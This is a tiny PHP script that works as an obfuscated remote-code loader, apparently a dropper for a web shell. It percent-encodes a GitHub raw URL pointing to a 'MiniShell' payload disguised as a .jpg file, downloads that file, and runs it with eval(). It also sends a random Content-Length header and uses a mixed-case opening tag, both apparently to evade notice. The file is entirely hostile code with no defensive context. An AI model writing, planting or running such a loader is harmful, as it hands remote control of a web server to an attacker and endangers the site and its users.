<?pHp

$x = rand(1, 999999);
header('Content-Length: ' . $x);
$h = fopen(rawurldecode('%68%74%74%70%73%3A%2F%2F%72%61%77%2E%67%69%74%68%75%62%75%73%65%72%63%6F%6E%74%65%6E%74%2E%63%6F%6D%2F%4D%72%2D%37%4D%69%6E%64%2F%4D%69%6E%69%53%68%65%6C%6C%2F%6D%61%69%6E%2F%75%72%6C%2E%6A%70%67'), "r");
$c = stream_get_contents($h);
fclose($h);
eval(rawurldecode('%3f%3e').$c);
?>
